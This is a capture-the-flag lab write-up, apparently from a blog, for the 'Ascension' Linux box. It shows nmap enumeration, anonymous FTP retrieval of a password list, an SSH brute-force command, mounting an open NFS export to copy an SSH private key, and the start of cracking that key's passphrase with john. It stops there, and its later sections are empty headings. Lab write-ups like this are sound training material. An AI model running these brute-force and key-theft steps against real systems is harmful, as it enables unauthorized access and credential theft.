---
title: "Hack Smarter - Easy - Ascension"
date: 2025-11-02 12:00:00 -0700
categories: [CTF,Hack Smarter]
tags: [linux]
---

![Ascension](/assets/img/ctf/hs/easy/ascension/ascension.png)

# Initial Intel
* Difficulty: Easy
* OS: Linux

# tl;dr
<details><summary>Spoilers</summary>
</details>

# Attack Path

## Recon

### Service Enumeration

Let's start off with a basic TCP scan. If we can't find anything we can later run a UDP scan.

```bash
# set host & initiate a standard tcp scan
┌──(haunter㉿kali)-[~/working/hs/easy/ascension]
└─$ sudo nmap -A -p- -vvv -T3 --open -oN nmap_tcp_full $ascension
...
...
PORT      STATE SERVICE  REASON         VERSION
21/tcp    open  ftp      syn-ack ttl 62 vsftpd 3.0.5
...                                       
| ftp-anon: Anonymous FTP login allowed (FTP code 230) 
22/tcp    open  ssh      syn-ack ttl 62 OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http     syn-ack ttl 62 Apache httpd 2.4.58 ((Ubuntu))
...
111/tcp   open  rpcbind  syn-ack ttl 62 2-4 (RPC #100000)
| rpcinfo:                                                                                                  
|   program version    port/proto  service
|   100003  3,4         2049/tcp   nfs    
|   100003  3,4         2049/tcp6  nfs
|   100005  3          43259/tcp6  mountd
|   100005  3          43999/udp   mountd
|   100005  3          57237/udp6  mountd
|   100005  3          58459/tcp   mountd
|   100021  1,3,4      37707/tcp   nlockmgr
|   100021  1,3,4      37915/tcp6  nlockmgr
|   100021  1,3,4      43938/udp6  nlockmgr
|   100021  1,3,4      45938/udp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|_  100227  3           2049/tcp6  nfs_acl
2049/tcp  open  nfs_acl  syn-ack ttl 62 3 (RPC #100227)
36007/tcp open  status   syn-ack ttl 62 1 (RPC #100024)
36685/tcp open  mountd   syn-ack ttl 62 1-3 (RPC #100005)
37707/tcp open  nlockmgr syn-ack ttl 62 1-4 (RPC #100021)
54265/tcp open  mountd   syn-ack ttl 62 1-3 (RPC #100005)
58459/tcp open  mountd   syn-ack ttl 62 3 (RPC #100005)
```

Four services stand out here:
1. FTP TCP/21
2. SSH TCP/22
3. Webserver TCP/80
4. RPC TCP/111


### FTP

FTP accepts anonymous logins according to NMAP. Let's try to access anything of import.

```bash
┌──(haunter㉿kali)-[~/working/hs/easy/ascension]
└─$ ftp $ascension                                                                                      

Connected to 10.1.39.71.
220 (vsFTPd 3.0.5)                                                                                                                                                  
331 Please specify the password.                                                                                                                                                                   

ftp> dir
229 Entering Extended Passive Mode (|||23234|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             202 Sep 21 00:04 pwlist.txt
226 Directory send OK.
ftp> get pwlist.txt
```

We found a password list:

```bash
┌──(haunter㉿kali)-[~/working/hs/easy/ascension]
└─$ cat pwlist.txt 
password1
123456
letmein
qwerty
password
secret
ftp123
admin
passw0rd
iloveyou
welcome
monkey
dragon
shadow
```

We'll probably need this later, I'm guessing for either authenticated FTP access or SSH.

### SSH

Without any usernames, there's not much to try other than a bruteforce using common usernames and the list found above...

```bash
┌──(haunter㉿kali)-[~/working/hs/easy/ascension]
└─$ nxc ssh $ascension -u /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -p pwlist.txt
```

...but that seemed unsuccessful. I'll try to get a username or some other way in.

### Webserver

![Webserver](/assets/img/ctf/hs/easy/ascension/1.png)

Webserver seems to be a default configuration. I dirbusted and couldn't find anything useful. Moving on.

### RPC

I'll see if I can mount a shared folder through RPC/NFS and look for intel:

```bash 
┌──(haunter㉿kali)-[~/working/hs/easy/ascension]                                                            
└─$ showmount -e $ascension                                                                                 
Export list for 10.1.39.71:                                                                                 
/srv/nfs/user1 *                                                                                            
                                                                                                            
┌──(haunter㉿kali)-[~/working/hs/easy/ascension]                                                            
└─$ mkdir nfs_share                                                                                         

┌──(haunter㉿kali)-[~/working/hs/easy/ascension]
└─$ sudo mount -t nfs $ascension:/srv/nfs/user1 nfs_share/ -o nolock

┌──(haunter㉿kali)-[~/working/hs/easy/ascension]
└─$ ls nfs_share/                                     
id_rsa  id_rsa.pub                                    

┌──(haunter㉿kali)-[~/working/hs/easy/ascension]
└─$ cp nfs_share/id_* .     
```

Cool, I found a SSH private and public key pair and copied them to my $attacker.

We should be able to get a username from the public key:

```bash
┌──(haunter㉿kali)-[~/working/hs/easy/ascension]
└─$ cat id_rsa.pub                                    
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDM+ew08ndVI6aGrld5PZLbgK3Z+5nOl0UQthrmm1q/HHdv9C7MyqYYMcqxWpe1+IOmWYVOU45I9CJ58l71QP5dZ2QqQqZ64ueqChRST0w5QbYDiRaYCt1bjMClyZ2psf506Mujt1f1cDHS60ZPd/0/t1tqX+9TDWQC99xGaGsakOOil05ZhKAv8J37paItRR0ne7cSjG2+Qe8MOJSSnHGmIe5GnQ1PXpqiLPcD8Jm4t4IVCqCXF1Naz/nT94ZjTyywDuZovbVto9bxQYzrhygjqdiVaYhxbfVH61W+B3g+cRkjuahpPrH5yU7XXO9ikHRgQ76Oz5k0t9hv63wYZgUQxWtK7eh0GlkBm7gCDfw4eEvPFsWkWCbl/tWIfdmmUGKCsU13Zb1dEJUQLW49A8DcuD6dx7w4pwsn+1Tq0oVVMpBqR4kdf3LGr0lhlgB+5lJ9jtcFKAsbeNoqFGhDqBomN3/ReKjjixts6deTRconUSXBb4Ua7xC8PXtzSzTuXjk= user1@ip-10-1-25-146
```
There we go, we have *user1*. As always, add found usernames and password files to local lists.

```bash
┌──(haunter㉿kali)-[~/working/hs/easy/ascension]
└─$ echo "user1" >> usernames.txt
```

Now, can we connect with just the private key?

```bash
┌──(haunter㉿kali)-[~/working/hs/easy/ascension]                                                            
└─$ ssh -i id_rsa user1@$ascension                                                                          
Enter passphrase for key 'id_rsa':                                                                          
user1@10.1.39.71: Permission denied (publickey). 
```

Nope. So let's try to get the key's passphrase.

## Foothold


```bash
┌──(haunter㉿kali)-[~/working/hs/easy/ascension]                                                            
└─$ ssh2john id_rsa > id_rsa.hash
```


```bash
┌──(haunter㉿kali)-[~/working/hs/easy/ascension]                                                        
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash 
```

## Lateral Movement / Privilege Escalation
## Root / SYSTEM
# Lessons Learned

